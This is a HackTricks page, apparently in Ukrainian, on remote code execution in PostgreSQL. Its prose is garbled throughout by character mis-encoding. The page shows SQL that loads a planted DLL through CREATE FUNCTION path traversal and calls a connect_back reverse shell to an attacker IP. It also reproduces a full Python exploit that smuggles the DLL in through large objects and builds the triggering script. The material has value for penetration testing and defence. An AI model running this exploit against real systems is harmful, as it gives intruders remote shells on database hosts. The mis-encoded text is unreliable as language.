–ó–Ω–∞—á–Ω–∞ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –≤–∏–Ω–∏–∫–∞—î –≤—ñ–¥ –∫–æ–º–∞–Ω–¥–∏ `CREATE FUNCTION`, —è–∫–∞ **–¥–æ–∑–≤–æ–ª—è—î –æ–±—Ö—ñ–¥ –∫–∞—Ç–∞–ª–æ–≥—ñ–≤** —É –∫–∞—Ç–∞–ª–æ–∑—ñ –¥–∞–Ω–∏—Ö. –í —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ñ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ **–µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ —Ü–µ–π –æ–±—Ö—ñ–¥** –¥–ª—è –∑–∞–ø–∏—Å—É —Ñ–∞–π–ª—É —Å–ø—ñ–ª—å–Ω–æ—ó –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ —É –∫–∞—Ç–∞–ª–æ–∑ –¥–∞–Ω–∏—Ö, –∞ –ø–æ—Ç—ñ–º **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –π–æ–≥–æ**. –¶—è –∞—Ç–∞–∫–∞ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –≤–∏–∫–æ–Ω–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–¥, –¥–æ—Å—è–≥–∞—é—á–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤–∏—Ö—ñ–¥–Ω–æ–≥–æ –∫–æ–¥—É –Ω–∞ —Å–∏—Å—Ç–µ–º—ñ.

#### –ü–æ—Å–ª—ñ–¥–æ–≤–Ω—ñ—Å—Ç—å –∞—Ç–∞–∫–∏

–°–ø–æ—á–∞—Ç–∫—É –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ **–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –≤–µ–ª–∏–∫—ñ –æ–±'—î–∫—Ç–∏ –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è dll**. –í–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏, —è–∫ —Ü–µ –∑—Ä–æ–±–∏—Ç–∏ —Ç—É—Ç:

{% content-ref url="big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

–ü—ñ—Å–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è (–∑ –Ω–∞–∑–≤–æ—é poc.dll –¥–ª—è —Ü—å–æ–≥–æ –ø—Ä–∏–∫–ª–∞–¥—É) —É –∫–∞—Ç–∞–ª–æ–≥ –¥–∞–Ω–∏—Ö –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –π–æ–≥–æ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```c
create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;
select connect_back('192.168.100.54', 1234);
```
_–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤–∞–º –Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ –¥–æ–¥–∞–≤–∞—Ç–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è `.dll`, –æ—Å–∫—ñ–ª—å–∫–∏ —Ñ—É–Ω–∫—Ü—ñ—è create –¥–æ–¥–∞—Å—Ç—å –π–æ–≥–æ._

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó **—á–∏—Ç–∞–π—Ç–µ** [**–æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—É –ø—É–±–ª—ñ–∫–∞—Ü—ñ—é —Ç—É—Ç**](https://srcincite.io/blog/2020/06/26/sql-injection-double-uppercut-how-to-achieve-remote-code-execution-against-postgresql.html)**.**\
–£ —Ü—ñ–π –ø—É–±–ª—ñ–∫–∞—Ü—ñ—ó **–±—É–≤** [**–≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –∫–æ–¥ –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è postgres**](https://github.com/sourceincite/tools/blob/master/pgpwn.c) (_—â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫ —Å–∫–æ–º–ø—ñ–ª—é–≤–∞—Ç–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è postgres, –ø—Ä–æ—á–∏—Ç–∞–π—Ç–µ –±—É–¥—å-—è–∫—É –∑ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ—Ö –≤–µ—Ä—Å—ñ–π_).\
–ù–∞ —Ç—ñ–π –∂–µ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ –±—É–ª–æ –Ω–∞–≤–µ–¥–µ–Ω–æ —Ü–µ–π **–µ–∫—Å–ø–ª–æ–π—Ç –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó** —Ü—ñ—î—ó —Ç–µ—Ö–Ω—ñ–∫–∏:
```python
#!/usr/bin/env python3
import sys

if len(sys.argv) != 4:
print("(+) usage %s <connectback> <port> <dll/so>" % sys.argv[0])
print("(+) eg: %s 192.168.100.54 1234 si-x64-12.dll" % sys.argv[0])
sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])
lib = sys.argv[3]
with open(lib, "rb") as dll:
d = dll.read()
sql = "select lo_import('C:/Windows/win.ini', 1337);"
for i in range(0, len(d)//2048):
start = i * 2048
end   = (i+1) * 2048
if i == 0:
sql += "update pg_largeobject set pageno=%d, data=decode('%s', 'hex') where loid=1337;" % (i, d[start:end].hex())
else:
sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % (i, d[start:end].hex())
if (len(d) % 2048) != 0:
end   = (i+1) * 2048
sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % ((i+1), d[end:].hex())

sql += "select lo_export(1337, 'poc.dll');"
sql += "create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;"
sql += "select connect_back('%s', %d);" % (host, port)
print("(+) building poc.sql file")
with open("poc.sql", "w") as sqlfile:
sqlfile.write(sql)
print("(+) run poc.sql in PostgreSQL using the superuser")
print("(+) for a db cleanup only, run the following sql:")
print("    select lo_unlink(l.oid) from pg_largeobject_metadata l;")
print("    drop function connect_back(text, integer);")
```
## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)
* [https://www.exploit-db.com/papers/13084](https://www.exploit-db.com/papers/13084)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* –í–∏ –ø—Ä–∞—Ü—é—î—Ç–µ –≤ **–∫—ñ–±–µ—Ä–±–µ–∑–ø–µ—Ü—ñ–≤—ñ–π –∫–æ–º–ø–∞–Ω—ñ—ó**? –•–æ—á–µ—Ç–µ, —â–æ–± –≤–∞—à–∞ **–∫–æ–º–ø–∞–Ω—ñ—è —Ä–µ–∫–ª–∞–º—É–≤–∞–ª–∞—Å—è –Ω–∞ HackTricks**? –∞–±–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ **–æ—Å—Ç–∞–Ω–Ω—å–æ—ó –≤–µ—Ä—Å—ñ—ó PEASS –∞–±–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**? –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** [**üí¨**](https://emojipedia.org/speech-balloon/) [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ –≥—Ä—É–ø–∏ [**telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –º–Ω–æ—é –Ω–∞ **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ [—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks](https://github.com/carlospolop/hacktricks) —Ç–∞ [—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
